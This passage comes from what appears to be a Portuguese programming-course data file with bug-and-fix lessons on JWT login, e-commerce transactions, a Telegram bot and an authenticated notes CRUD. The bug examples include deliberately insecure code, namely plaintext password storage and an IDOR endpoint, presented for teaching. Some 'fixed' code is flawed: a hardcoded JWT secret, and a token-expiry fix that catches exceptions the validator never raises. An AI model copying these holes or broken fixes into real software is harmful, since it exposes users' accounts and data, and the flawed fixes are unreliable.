# service.py — logica de negocio, sem HTTP e sem SQL direto
# repository.py — unico lugar com SQL, retorna dicts puros
#
# Fluxo: routes -> service -> repository -> SQLite
# Para trocar SQLite por PostgreSQL: altere apenas repository.py`,
        },
        checkpoint: 'routes.py nao tem SQL. service.py nao tem detalhes HTTP.',
      },
    ],
  },
  // ─── Projeto 5: Sistema de Login ──────────────────────────────────────────
  {
    id: 'sistema-login',
    title: 'Sistema de Login Completo',
    subtitle: 'Autenticacao real com senha hash, JWT e sessoes',
    description:
      'Construa do zero um sistema de autenticacao como os usados em producao: registro, login, token JWT, rotas protegidas e logout. Voce vai entender por que armazenar senha em texto puro e um crime, como tokens funcionam e o que acontece quando eles expiram.',
    difficulty: 'avancado',
    totalTime: '~6h',
    techStack: ['Python', 'Flask', 'SQLite', 'bcrypt', 'JWT'],
    whatYoullLearn: [
      'hash de senha com bcrypt',
      'JWT (JSON Web Token)',
      'rotas protegidas',
      'middleware de autenticacao',
      'expiracao de token',
      'seguranca basica em APIs',
    ],
    steps: [
      {
        id: 'login-1',
        order: 1,
        type: 'bug',
        title: 'O Erro Classico: Senha em Texto Puro',
        context:
          'Todo iniciante ja fez isso. E todo vazamento de banco que voce le no jornal provavelmente comecou assim.',
        objective: 'Entender por que nunca se armazena senha diretamente no banco.',
        concepts: ['seguranca', 'hash', 'banco de dados', 'vazamento'],
        bugCode: {
          filename: 'auth_errado.py',
          language: 'python',
          code: `import sqlite3

def registrar(email: str, senha: str) -> None:
    conn = sqlite3.connect("usuarios.db")
    # NUNCA FACA ISSO — senha salva em texto puro
    conn.execute(
        "INSERT INTO usuarios (email, senha) VALUES (?, ?)",
        (email, senha),
    )
    conn.commit()

def login(email: str, senha: str) -> bool:
    conn = sqlite3.connect("usuarios.db")
    row = conn.execute(
        "SELECT senha FROM usuarios WHERE email = ?", (email,)
    ).fetchone()
    return row is not None and row[0] == senha`,
        },
        bugDescription:
          'Se o banco vazar (SQL injection, backup exposto, ex-funcionario), TODAS as senhas de todos os usuarios ficam expostas em texto legivel.',
        bugLesson:
          'Bancos vazam. Servidores sao invadidos. Por isso nunca se guarda a senha — guarda-se um hash irreversivel dela. Mesmo quem tem acesso ao banco nao consegue descobrir a senha original.',
        fixedCode: {
          filename: 'auth_seguro.py',
          language: 'python',
          code: `import sqlite3
import bcrypt


def registrar(email: str, senha: str) -> None:
    # bcrypt gera um hash seguro — cada chamada gera um hash diferente
    senha_hash = bcrypt.hashpw(senha.encode(), bcrypt.gensalt())
    conn = sqlite3.connect("usuarios.db")
    conn.execute(
        "INSERT INTO usuarios (email, senha_hash) VALUES (?, ?)",
        (email, senha_hash),
    )
    conn.commit()


def login(email: str, senha: str) -> bool:
    conn = sqlite3.connect("usuarios.db")
    row = conn.execute(
        "SELECT senha_hash FROM usuarios WHERE email = ?", (email,)
    ).fetchone()
    if row is None:
        return False
    # checkpw compara a senha digitada com o hash salvo
    return bcrypt.checkpw(senha.encode(), row[0])`,
        },
        checkpoint: 'Senhas sao armazenadas como hash bcrypt, nunca em texto puro.',
      },
      {
        id: 'login-2',
        order: 2,
        type: 'integration',
        title: 'Emitindo Tokens JWT',
        context:
          'Apos o login bem-sucedido, o servidor precisa provar ao cliente que ele esta autenticado. JWT e o padrao da industria para isso.',
        objective: 'Gerar e validar tokens JWT com expiracao.',
        concepts: ['JWT', 'payload', 'assinatura', 'expiracao', 'Bearer token'],
        code: {
          filename: 'token.py',
          language: 'python',
          code: `import jwt
import datetime

SECRET = "chave-super-secreta-troque-em-producao"


def gerar_token(user_id: int) -> str:
    payload = {
        "sub": user_id,          # quem e o usuario
        "iat": datetime.datetime.utcnow(),  # quando foi emitido
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1),  # expira em 1h
    }
    return jwt.encode(payload, SECRET, algorithm="HS256")


def validar_token(token: str) -> dict:
    try:
        return jwt.decode(token, SECRET, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        raise ValueError("Token expirado. Faca login novamente.")
    except jwt.InvalidTokenError:
        raise ValueError("Token invalido.")`,
        },
        checkpoint: 'Login retorna um token JWT valido com expiracao de 1 hora.',
      },
      {
        id: 'login-3',
        order: 3,
        type: 'code',
        title: 'Rotas Protegidas com Middleware',
        context:
          'De nada adianta ter token se qualquer rota pode ser acessada sem ele. O middleware verifica o token antes de cada rota protegida.',
        objective: 'Criar um decorator Flask que exige token valido.',
        concepts: ['middleware', 'decorator', 'Authorization header', 'Bearer', '403 Forbidden'],
        code: {
          filename: 'middleware.py',
          language: 'python',
          code: `from functools import wraps
from flask import request, jsonify
from token import validar_token


def requer_login(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        auth = request.headers.get("Authorization", "")
        if not auth.startswith("Bearer "):
            return jsonify({"erro": "Token ausente"}), 401
        token = auth.split(" ")[1]
        try:
            payload = validar_token(token)
            request.user_id = payload["sub"]
        except ValueError as e:
            return jsonify({"erro": str(e)}), 401
        return f(*args, **kwargs)
    return wrapper


# Uso:
# @app.route("/perfil")
# @requer_login
# def perfil():
#     return jsonify({"user_id": request.user_id})`,
        },
        checkpoint: 'Rotas com @requer_login retornam 401 sem token valido.',
      },
      {
        id: 'login-4',
        order: 4,
        type: 'bug',
        title: 'Token Expirado em Producao',
        context:
          'Em desenvolvimento tudo funciona. Em producao, usuarios ficam logados por dias — e o token expira no meio de uma acao.',
        objective: 'Tratar expiracao de token com mensagem util e fluxo de refresh.',
        concepts: ['ExpiredSignatureError', 'refresh token', 'UX de autenticacao'],
        bugCode: {
          filename: 'sem_tratamento.py',
          language: 'python',
          code: `# Sem tratamento de expiracao
@app.route("/dados-sensiveis")
@requer_login
def dados():
    # Se o token expirou, o middleware lanca ValueError
    # O Flask retorna 500 Internal Server Error — confuso para o cliente
    return jsonify({"dados": "informacao importante"})`,
        },
        bugDescription:
          'O cliente recebe um erro 500 generico sem saber que precisa fazer login novamente. A sessao do usuario quebra silenciosamente.',
        bugLesson:
          'Expiracao de token e esperada, nao e um erro do servidor. Retorne 401 com mensagem clara: "Sessao expirada, faca login novamente." O frontend deve redirecionar para login ao receber 401.',
        fixedCode: {
          filename: 'com_tratamento.py',
          language: 'python',
          code: `# middleware.py atualizado
def requer_login(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        auth = request.headers.get("Authorization", "")
        if not auth.startswith("Bearer "):
            return jsonify({"erro": "Nao autenticado", "code": "MISSING_TOKEN"}), 401
        token = auth.split(" ")[1]
        try:
            payload = validar_token(token)
            request.user_id = payload["sub"]
        except jwt.ExpiredSignatureError:
            # 401 com codigo especifico — o frontend sabe que deve pedir novo login
            return jsonify({"erro": "Sessao expirada", "code": "TOKEN_EXPIRED"}), 401
        except jwt.InvalidTokenError:
            return jsonify({"erro": "Token invalido", "code": "INVALID_TOKEN"}), 401
        return f(*args, **kwargs)
    return wrapper`,
        },
        checkpoint: 'Token expirado retorna 401 com code TOKEN_EXPIRED, nao 500.',
      },
      {
        id: 'login-5',
        order: 5,
        type: 'architecture',
        title: 'Estrutura Final do Projeto',
        context:
          'Um sistema de autenticacao real em producao e separado em modulos claros. Cada arquivo tem uma unica responsabilidade.',
        objective: 'Organizar o sistema completo em modulos separados.',
        concepts: ['modularizacao', 'separacao de responsabilidades', 'seguranca', 'escalabilidade'],
        code: {
          filename: 'estrutura.txt',
          language: 'bash',
          code: `auth-system/
  app.py          # cria o app Flask e registra rotas
  config.py       # SECRET_KEY, configuracoes de ambiente
  database.py     # conexao SQLite, criacao de tabelas
  models/
    usuario.py    # classe Usuario com metodos de banco
  auth/
    routes.py     # POST /registro, POST /login, POST /logout
    middleware.py # decorator @requer_login
    token.py      # gerar_token(), validar_token()
    hash.py       # hash_senha(), verificar_senha()
  requirements.txt
    flask
    bcrypt
    pyjwt`,
        },
        checkpoint: 'O sistema de login funciona completo com registro, login, rotas protegidas e logout.',
      },
    ],
  },

  // ─── Projeto 6: E-commerce Simples ────────────────────────────────────────
  {
    id: 'ecommerce-simples',
    title: 'E-commerce Simples',
    subtitle: 'Produtos, carrinho, pedidos e banco de dados relacional',
    description:
      'Construa o backend de uma loja online do zero. Voce vai modelar um banco de dados relacional com multiplas tabelas, criar endpoints para produtos e carrinho, calcular totais e processar pedidos — lidando com bugs reais como race conditions e dados inconsistentes.',
    difficulty: 'avancado',
    totalTime: '~8h',
    techStack: ['Python', 'Flask', 'SQLite', 'SQL relacional', 'REST API'],
    whatYoullLearn: [
      'modelagem relacional (FK, JOIN)',
      'transacoes de banco de dados',
      'race condition',
      'calculo de totais',
      'estado de pedido (state machine)',
      'dados inconsistentes',
    ],
    steps: [
      {
        id: 'ecom-1',
        order: 1,
        type: 'code',
        title: 'Modelagem do Banco de Dados',
        context:
          'Antes de escrever uma linha de Flask, o banco de dados precisa estar bem modelado. Corrigir o schema depois que dados existem e muito mais trabalhoso.',
        objective: 'Criar as tabelas com relacionamentos corretos.',
        concepts: ['PRIMARY KEY', 'FOREIGN KEY', 'relacionamento 1:N', 'schema design'],
        code: {
          filename: 'schema.sql',
          language: 'sql',
          code: `-- Produtos
CREATE TABLE produtos (
    id        INTEGER PRIMARY KEY AUTOINCREMENT,
    nome      TEXT NOT NULL,
    preco     REAL NOT NULL CHECK(preco > 0),
    estoque   INTEGER NOT NULL DEFAULT 0 CHECK(estoque >= 0),
    criado_em DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Pedidos (cabecalho)
CREATE TABLE pedidos (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    status     TEXT NOT NULL DEFAULT 'pendente',  -- pendente|pago|cancelado
    total      REAL NOT NULL DEFAULT 0,
    criado_em  DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Itens do pedido (relacao N:N entre pedidos e produtos)
CREATE TABLE itens_pedido (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    pedido_id   INTEGER NOT NULL REFERENCES pedidos(id),
    produto_id  INTEGER NOT NULL REFERENCES produtos(id),
    quantidade  INTEGER NOT NULL CHECK(quantidade > 0),
    preco_unit  REAL NOT NULL   -- preco no momento da compra (nao muda)
);`,
        },
        checkpoint: 'Banco criado com 3 tabelas e constraints corretos.',
      },
      {
        id: 'ecom-2',
        order: 2,
        type: 'bug',
        title: 'O Bug do Estoque Negativo',
        context:
          'Dois clientes compram o ultimo item ao mesmo tempo. Sem protecao, o estoque vai para -1.',
        objective: 'Usar transacao atomica para garantir consistencia do estoque.',
        concepts: ['race condition', 'transacao', 'atomicidade', 'integridade de dados'],
        bugCode: {
          filename: 'estoque_errado.py',
          language: 'python',
          code: `def comprar_produto(produto_id: int, qtd: int) -> bool:
    conn = sqlite3.connect("loja.db")
    row = conn.execute(
        "SELECT estoque FROM produtos WHERE id = ?", (produto_id,)
    ).fetchone()

    # PROBLEMA: entre o SELECT e o UPDATE, outro request pode comprar
    if row and row[0] >= qtd:
        conn.execute(
            "UPDATE produtos SET estoque = estoque - ? WHERE id = ?",
            (qtd, produto_id)
        )
        conn.commit()
        return True
    return False`,
        },
        bugDescription:
          'Se dois requests chegam ao mesmo tempo, ambos leem estoque=1, ambos passam no `if`, e ambos debitam — resultado: estoque=-1.',
        bugLesson:
          'Qualquer operacao que le e depois escreve precisa ser atomica. Use transacao com verificacao no proprio UPDATE.',
        fixedCode: {
          filename: 'estoque_seguro.py',
          language: 'python',
          code: `def comprar_produto(produto_id: int, qtd: int) -> bool:
    conn = sqlite3.connect("loja.db")
    conn.isolation_level = None  # controle manual de transacao
    try:
        conn.execute("BEGIN")
        # UPDATE atomico: so debita se tiver estoque suficiente
        cursor = conn.execute(
            """UPDATE produtos
               SET estoque = estoque - ?
               WHERE id = ? AND estoque >= ?""",
            (qtd, produto_id, qtd),
        )
        if cursor.rowcount == 0:
            # Nenhuma linha atualizada = sem estoque
            conn.execute("ROLLBACK")
            return False
        conn.execute("COMMIT")
        return True
    except Exception:
        conn.execute("ROLLBACK")
        raise`,
        },
        checkpoint: 'Estoque nunca fica negativo mesmo com requests simultaneos.',
      },
      {
        id: 'ecom-3',
        order: 3,
        type: 'integration',
        title: 'Criando e Calculando Pedidos',
        context:
          'Um pedido e uma transacao completa: debitar estoque, registrar itens e calcular total — tudo junto ou nada.',
        objective: 'Criar endpoint POST /pedidos que processa multiplos itens atomicamente.',
        concepts: ['transacao multi-tabela', 'calculo de total', 'rollback parcial'],
        code: {
          filename: 'pedidos.py',
          language: 'python',
          code: `@app.route("/pedidos", methods=["POST"])
def criar_pedido():
    itens = request.json.get("itens", [])
    if not itens:
        return jsonify({"erro": "Pedido sem itens"}), 400

    conn = get_db()
    try:
        conn.execute("BEGIN")
        total = 0.0
        pedido_id = conn.execute(
            "INSERT INTO pedidos (status) VALUES ('pendente')"
        ).lastrowid

        for item in itens:
            pid, qtd = item["produto_id"], item["quantidade"]
            produto = conn.execute(
                "SELECT preco, estoque FROM produtos WHERE id = ?", (pid,)
            ).fetchone()

            if not produto or produto["estoque"] < qtd:
                conn.execute("ROLLBACK")
                return jsonify({"erro": f"Produto {pid} sem estoque"}), 409

            preco = produto["preco"]
            conn.execute(
                "INSERT INTO itens_pedido (pedido_id, produto_id, quantidade, preco_unit) VALUES (?,?,?,?)",
                (pedido_id, pid, qtd, preco),
            )
            conn.execute(
                "UPDATE produtos SET estoque = estoque - ? WHERE id = ?", (qtd, pid)
            )
            total += preco * qtd

        conn.execute("UPDATE pedidos SET total = ? WHERE id = ?", (total, pedido_id))
        conn.execute("COMMIT")
        return jsonify({"pedido_id": pedido_id, "total": total}), 201
    except Exception as e:
        conn.execute("ROLLBACK")
        return jsonify({"erro": str(e)}), 500`,
        },
        checkpoint: 'POST /pedidos cria pedido completo com rollback em caso de erro.',
      },
      {
        id: 'ecom-4',
        order: 4,
        type: 'bug',
        title: 'Preco que Muda Apos a Compra',
        context:
          'O cliente comprou por R$50. O admin atualizou o preco para R$80. O pedido antigo agora mostra R$80 — errado.',
        objective: 'Entender por que preco_unit e salvo no momento da compra.',
        concepts: ['snapshot de dados', 'historico imutavel', 'integridade temporal'],
        bugCode: {
          filename: 'preco_errado.py',
          language: 'python',
          code: `# Schema errado: item do pedido so tem referencia ao produto
CREATE TABLE itens_pedido (
    id         INTEGER PRIMARY KEY,
    pedido_id  INTEGER REFERENCES pedidos(id),
    produto_id INTEGER REFERENCES produtos(id),
    quantidade INTEGER
    -- SEM preco_unit aqui
);

-- Para calcular o total, buscamos o preco atual do produto
-- PROBLEMA: se o preco mudar, o historico de pedidos muda tambem`,
        },
        bugDescription:
          'O preco de um produto e um dado que muda com o tempo. Um pedido e um fato historico que nao pode mudar. Guardar apenas a referencia ao produto quebra o historico.',
        bugLesson:
          'Sempre salve o preco no momento da transacao (preco_unit na tabela itens_pedido). Isso garante que o historico de pedidos seja imutavel — como deve ser.',
        fixedCode: {
          filename: 'preco_correto.sql',
          language: 'sql',
          code: `-- Schema correto: preco_unit captura o preco no momento da compra
CREATE TABLE itens_pedido (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    pedido_id   INTEGER NOT NULL REFERENCES pedidos(id),
    produto_id  INTEGER NOT NULL REFERENCES produtos(id),
    quantidade  INTEGER NOT NULL,
    preco_unit  REAL NOT NULL  -- snapshot do preco na hora da compra
);

-- Agora o admin pode mudar o preco do produto
-- sem afetar pedidos ja realizados`,
        },
        checkpoint: 'Pedidos antigos mantem o preco original mesmo apos atualizacao do produto.',
      },
      {
        id: 'ecom-5',
        order: 5,
        type: 'architecture',
        title: 'Estrutura Final do E-commerce',
        context:
          'Um backend de e-commerce em producao e organizado por dominios de negocio — cada dominio tem suas proprias rotas, servicos e repositorios.',
        objective: 'Organizar o projeto em modulos por dominio.',
        concepts: ['domain-driven', 'modularizacao', 'escalabilidade', 'manutencao'],
        code: {
          filename: 'estrutura.txt',
          language: 'bash',
          code: `ecommerce/
  app.py              # factory do Flask, registra blueprints
  database.py         # conexao, criacao de schema
  produtos/
    routes.py         # GET /produtos, POST /produtos, etc.
    service.py        # logica: validar preco, verificar estoque
    repository.py     # queries SQL de produto
  pedidos/
    routes.py         # POST /pedidos, GET /pedidos/<id>
    service.py        # logica: calcular total, mudar status
    repository.py     # queries SQL de pedido + itens
  requirements.txt
    flask
    flask-sqlalchemy  # ORM opcional para projetos maiores`,
        },
        checkpoint: 'Projeto organizado por dominio, cada modulo com rotas/servico/repositorio.',
      },
    ],
  },

  // ─── Projeto 7: Bot de Notificacoes ──────────────────────────────────────
  {
    id: 'bot-notificacoes',
    title: 'Bot de Notificacoes',
    subtitle: 'Integracao com API do Telegram, agendamento e persistencia',
    description:
      'Construa um bot real do Telegram que envia notificacoes agendadas. Voce vai integrar com a API oficial, lidar com webhooks, tratar erros de rede e implementar agendamento de mensagens — tudo que um bot de producao precisa.',
    difficulty: 'intermediario',
    totalTime: '~4h',
    techStack: ['Python', 'requests', 'Telegram Bot API', 'SQLite', 'schedule'],
    whatYoullLearn: [
      'integracao com API de terceiros',
      'polling vs webhook',
      'tratamento de erros de rede',
      'agendamento de tarefas',
      'persistencia de estado do bot',
    ],
    steps: [
      {
        id: 'bot-1',
        order: 1,
        type: 'code',
        title: 'Primeira Mensagem pelo Bot',
        context:
          'A Telegram Bot API e uma das APIs mais simples e bem documentadas do mundo. O conceito aqui se aplica a qualquer API de mensageria.',
        objective: 'Enviar uma mensagem via HTTP para a API do Telegram.',
        concepts: ['Bot Token', 'chat_id', 'sendMessage', 'API REST', 'requests.post'],
        code: {
          filename: 'bot_basico.py',
          language: 'python',
          code: `import requests

TOKEN = "SEU_BOT_TOKEN"  # obtido via @BotFather no Telegram
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"


def enviar_mensagem(chat_id: int, texto: str) -> dict:
    response = requests.post(
        f"{BASE_URL}/sendMessage",
        json={"chat_id": chat_id, "text": texto},
        timeout=10,
    )
    response.raise_for_status()
    return response.json()


# Teste
enviar_mensagem(SEU_CHAT_ID, "Bot funcionando!")`,
        },
        checkpoint: 'Bot envia mensagem com sucesso para o chat especificado.',
      },
      {
        id: 'bot-2',
        order: 2,
        type: 'bug',
        title: 'Bot Offline — A API do Telegram Caiu',
        context:
          'APIs de terceiros ficam offline, tem rate limits e retornam erros inesperados. Seu bot precisa sobreviver a isso.',
        objective: 'Implementar retry automatico com backoff exponencial.',
        concepts: ['retry', 'backoff exponencial', 'timeout', 'resiliencia'],
        bugCode: {
          filename: 'sem_retry.py',
          language: 'python',
          code: `def enviar_mensagem(chat_id: int, texto: str) -> dict:
    # Se a API do Telegram estiver lenta ou offline:
    # requests.exceptions.Timeout ou ConnectionError
    # O bot para de funcionar completamente
    response = requests.post(
        f"{BASE_URL}/sendMessage",
        json={"chat_id": chat_id, "text": texto},
    )
    return response.json()`,
        },
        bugDescription:
          'Uma falha temporaria de rede mata o bot. Mensagens sao perdidas permanentemente sem nenhum aviso.',
        bugLesson:
          'Erros de rede sao temporarios na maioria dos casos. Retry com backoff exponencial (1s, 2s, 4s...) resolve a maioria sem incomodar o usuario.',
        fixedCode: {
          filename: 'com_retry.py',
          language: 'python',
          code: `import time

def enviar_mensagem(chat_id: int, texto: str, tentativas: int = 3) -> dict:
    delay = 1
    for i in range(tentativas):
        try:
            response = requests.post(
                f"{BASE_URL}/sendMessage",
                json={"chat_id": chat_id, "text": texto},
                timeout=10,
            )
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            if i == tentativas - 1:
                raise RuntimeError(f"Falha apos {tentativas} tentativas: {e}")
            print(f"Tentativa {i+1} falhou. Aguardando {delay}s...")
            time.sleep(delay)
            delay *= 2  # backoff exponencial: 1s, 2s, 4s`,
        },
        checkpoint: 'Bot tenta reenviar automaticamente com backoff antes de desistir.',
      },
      {
        id: 'bot-3',
        order: 3,
        type: 'integration',
        title: 'Agendando Notificacoes',
        context:
          'Um bot util envia mensagens no momento certo — lembretes, relatorios diarios, alertas. Isso exige agendamento persistente.',
        objective: 'Salvar notificacoes agendadas no banco e disparar no horario certo.',
        concepts: ['agendamento', 'SQLite', 'polling de banco', 'datetime', 'job scheduling'],
        code: {
          filename: 'agendador.py',
          language: 'python',
          code: `import sqlite3
import time
import datetime

def agendar(chat_id: int, mensagem: str, enviar_em: datetime.datetime) -> None:
    conn = sqlite3.connect("bot.db")
    conn.execute(
        "INSERT INTO notificacoes (chat_id, mensagem, enviar_em, enviado) VALUES (?,?,?,0)",
        (chat_id, mensagem, enviar_em.isoformat()),
    )
    conn.commit()
    print(f"Agendado para {enviar_em}: {mensagem}")


def loop_disparador() -> None:
    print("Disparador rodando...")
    while True:
        conn = sqlite3.connect("bot.db")
        agora = datetime.datetime.utcnow().isoformat()
        pendentes = conn.execute(
            "SELECT id, chat_id, mensagem FROM notificacoes WHERE enviar_em <= ? AND enviado = 0",
            (agora,),
        ).fetchall()
        for row in pendentes:
            try:
                enviar_mensagem(row["chat_id"], row["mensagem"])
                conn.execute("UPDATE notificacoes SET enviado = 1 WHERE id = ?", (row["id"],))
                conn.commit()
            except Exception as e:
                print(f"Erro ao enviar {row['id']}: {e}")
        time.sleep(30)  # verifica a cada 30 segundos`,
        },
        checkpoint: 'Notificacoes agendadas sao disparadas automaticamente no horario certo.',
      },
      {
        id: 'bot-4',
        order: 4,
        type: 'bug',
        title: 'Mensagem Enviada Duas Vezes',
        context:
          'O bot reiniciou no exato momento em que estava enviando uma mensagem. Ao voltar, reenviou a mesma mensagem.',
        objective: 'Garantir que cada notificacao seja enviada exatamente uma vez.',
        concepts: ['idempotencia', 'estado atomico', 'at-least-once vs exactly-once'],
        bugCode: {
          filename: 'duplicado.py',
          language: 'python',
          code: `# Fluxo perigoso (sem atomicidade):
# 1. Busca notificacoes pendentes
# 2. Envia mensagem via API
# 3. Marca como enviado no banco
#
# Se o processo morrer entre os passos 2 e 3:
# - A mensagem JA foi enviada
# - Mas ainda aparece como "nao enviado"
# - No proximo ciclo, sera enviada de novo`,
        },
        bugDescription:
          'Entre enviar e marcar como enviado existe uma janela de falha. Reinicializacoes, crashes e timeouts podem causar envio duplicado.',
        bugLesson:
          'Marque como "processando" ANTES de enviar. Se falhar, fica como processando (nao reenvia). Implemente limpeza de registros presos.',
        fixedCode: {
          filename: 'idempotente.py',
          language: 'python',
          code: `def disparar_pendentes(conn) -> None:
    agora = datetime.datetime.utcnow().isoformat()

    # Marca como "processando" antes de enviar — previne reenvio duplo
    conn.execute(
        """UPDATE notificacoes
           SET status = 'processando'
           WHERE enviar_em <= ? AND status = 'pendente'""",
        (agora,),
    )
    conn.commit()

    pendentes = conn.execute(
        "SELECT id, chat_id, mensagem FROM notificacoes WHERE status = 'processando'"
    ).fetchall()

    for row in pendentes:
        try:
            enviar_mensagem(row["chat_id"], row["mensagem"])
            conn.execute(
                "UPDATE notificacoes SET status = 'enviado' WHERE id = ?", (row["id"],)
            )
        except Exception:
            # Volta para pendente para tentar de novo
            conn.execute(
                "UPDATE notificacoes SET status = 'pendente' WHERE id = ?", (row["id"],)
            )
        conn.commit()`,
        },
        checkpoint: 'Cada notificacao e enviada exatamente uma vez, mesmo com reinicializacoes.',
      },
      {
        id: 'bot-5',
        order: 5,
        type: 'architecture',
        title: 'Estrutura Final do Bot',
        context:
          'Um bot de producao separa claramente o que envia, o que agenda e o que persiste.',
        objective: 'Organizar o bot em modulos independentes.',
        concepts: ['modularizacao', 'separacao de responsabilidades', 'bot de producao'],
        code: {
          filename: 'estrutura.txt',
          language: 'bash',
          code: `telegram-bot/
  main.py           # ponto de entrada, inicia o loop
  config.py         # TOKEN, CHAT_IDs, configuracoes
  telegram/
    client.py       # enviar_mensagem() com retry
    formatter.py    # formatar texto, emojis, markdown
  scheduler/
    agendador.py    # agendar(), cancelar()
    disparador.py   # loop que busca e envia pendentes
  database/
    db.py           # conexao e criacao de tabelas
    notificacoes.py # queries de notificacoes
  requirements.txt
    requests
    schedule`,
        },
        checkpoint: 'Bot organizado, extensivel e pronto para adicionar novos tipos de notificacao.',
      },
    ],
  },

  // ─── Projeto 8: CRUD com Autenticacao ────────────────────────────────────
  {
    id: 'crud-com-auth',
    title: 'CRUD Completo com Autenticacao',
    subtitle: 'Usuarios, recursos protegidos e permissoes — do zero',
    description:
      'Una tudo que voce aprendeu: banco de dados relacional, autenticacao JWT, validacao de dados e arquitetura em camadas. Voce vai construir um sistema onde usuarios se registram, fazem login e gerenciam seus proprios recursos — com regras de permissao reais.',
    difficulty: 'avancado',
    totalTime: '~10h',
    techStack: ['Python', 'Flask', 'SQLite', 'JWT', 'bcrypt', 'REST API'],
    whatYoullLearn: [
      'sistema completo de ponta a ponta',
      'autorizacao por ownership',
      'validacao em multiplas camadas',
      'erros HTTP semanticos',
      'arquitetura de producao',
      'testes manuais com curl',
    ],
    steps: [
      {
        id: 'auth-crud-1',
        order: 1,
        type: 'code',
        title: 'Schema: Usuarios e Notas',
        context:
          'Vamos construir um app de notas pessoais. Cada usuario tem suas proprias notas — e nao pode ver as notas dos outros.',
        objective: 'Modelar banco com usuarios e notas relacionados.',
        concepts: ['FOREIGN KEY', 'ownership', 'modelagem relacional'],
        code: {
          filename: 'schema.sql',
          language: 'sql',
          code: `CREATE TABLE usuarios (
    id           INTEGER PRIMARY KEY AUTOINCREMENT,
    email        TEXT UNIQUE NOT NULL,
    senha_hash   TEXT NOT NULL,
    criado_em    DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE notas (
    id           INTEGER PRIMARY KEY AUTOINCREMENT,
    usuario_id   INTEGER NOT NULL REFERENCES usuarios(id) ON DELETE CASCADE,
    titulo       TEXT NOT NULL,
    conteudo     TEXT NOT NULL DEFAULT '',
    atualizado_em DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Cada nota pertence a um usuario (usuario_id = dono)
-- ON DELETE CASCADE: se o usuario for deletado, suas notas somem tambem`,
        },
        checkpoint: 'Schema criado com relacionamento entre usuarios e notas.',
      },
      {
        id: 'auth-crud-2',
        order: 2,
        type: 'bug',
        title: 'Acessando Nota de Outro Usuario',
        context:
          'O maior bug de seguranca em sistemas com usuarios: nao verificar se o recurso pertence a quem esta pedindo.',
        objective: 'Implementar verificacao de ownership em todos os endpoints.',
        concepts: ['autorizacao', 'ownership check', 'IDOR (Insecure Direct Object Reference)', '403 Forbidden'],
        bugCode: {
          filename: 'sem_ownership.py',
          language: 'python',
          code: `@app.route("/notas/<int:nota_id>", methods=["GET"])
@requer_login
def obter_nota(nota_id: int):
    nota = db.execute(
        "SELECT * FROM notas WHERE id = ?", (nota_id,)
    ).fetchone()
    if nota is None:
        return jsonify({"erro": "Nao encontrada"}), 404
    # BUG: qualquer usuario logado pode ver qualquer nota
    # Usuario A pode acessar /notas/99 que pertence ao Usuario B
    return jsonify(dict(nota))`,
        },
        bugDescription:
          'IDOR (Insecure Direct Object Reference) — o usuario acessa diretamente o ID do recurso sem verificar se e o dono. E um dos top 10 vulnerabilidades OWASP.',
        bugLesson:
          'SEMPRE inclua `AND usuario_id = ?` nas queries de recursos privados. Retorne 404 (nao 403) para nao revelar que o recurso existe.',
        fixedCode: {
          filename: 'com_ownership.py',
          language: 'python',
          code: `@app.route("/notas/<int:nota_id>", methods=["GET"])
@requer_login
def obter_nota(nota_id: int):
    nota = db.execute(
        # Filtra por id E por usuario_id — ownership check
        "SELECT * FROM notas WHERE id = ? AND usuario_id = ?",
        (nota_id, request.user_id),
    ).fetchone()
    if nota is None:
        # 404 mesmo se existir mas nao for do usuario
        # Nao revela que a nota existe para outro usuario
        return jsonify({"erro": "Nao encontrada"}), 404
    return jsonify(dict(nota))`,
        },
        checkpoint: 'Usuarios so acessam suas proprias notas. Notas de outros retornam 404.',
      },
      {
        id: 'auth-crud-3',
        order: 3,
        type: 'integration',
        title: 'CRUD Completo de Notas',
        context:
          'Com a seguranca correta estabelecida, implementamos todos os endpoints de notas com validacao adequada.',
        objective: 'Implementar os 4 endpoints com autenticacao e ownership.',
        concepts: ['CRUD protegido', 'validacao', 'status codes semanticos', 'paginacao basica'],
        code: {
          filename: 'notas_routes.py',
          language: 'python',
          code: `@bp.route("/notas", methods=["GET"])
@requer_login
def listar_notas():
    notas = db.execute(
        "SELECT id, titulo, atualizado_em FROM notas WHERE usuario_id = ? ORDER BY atualizado_em DESC",
        (request.user_id,),
    ).fetchall()
    return jsonify([dict(n) for n in notas])


@bp.route("/notas", methods=["POST"])
@requer_login
def criar_nota():
    data = request.json or {}
    titulo = data.get("titulo", "").strip()
    if not titulo:
        return jsonify({"erro": "titulo obrigatorio"}), 400
    nota_id = db.execute(
        "INSERT INTO notas (usuario_id, titulo, conteudo) VALUES (?,?,?)",
        (request.user_id, titulo, data.get("conteudo", "")),
    ).lastrowid
    db.commit()
    return jsonify({"id": nota_id}), 201


@bp.route("/notas/<int:nota_id>", methods=["PUT"])
@requer_login
def atualizar_nota(nota_id: int):
    data = request.json or {}
    cursor = db.execute(
        """UPDATE notas SET titulo=?, conteudo=?, atualizado_em=CURRENT_TIMESTAMP
           WHERE id=? AND usuario_id=?""",
        (data.get("titulo"), data.get("conteudo"), nota_id, request.user_id),
    )
    db.commit()
    if cursor.rowcount == 0:
        return jsonify({"erro": "Nao encontrada"}), 404
    return jsonify({"ok": True})`,
        },
        checkpoint: 'CRUD completo de notas funcionando com autenticacao e ownership.',
      },
      {
        id: 'auth-crud-4',
        order: 4,
        type: 'bug',
        title: 'Validacao Inconsistente',
        context:
          'A validacao so existe na criacao. Na atualizacao, o usuario pode enviar titulo vazio ou um payload completamente invalido.',
        objective: 'Centralizar validacao em uma funcao reutilizavel.',
        concepts: ['DRY (Dont Repeat Yourself)', 'validacao centralizada', 'schema validation'],
        bugCode: {
          filename: 'validacao_duplicada.py',
          language: 'python',
          code: `# Criacao: valida titulo
def criar_nota():
    if not data.get("titulo", "").strip():
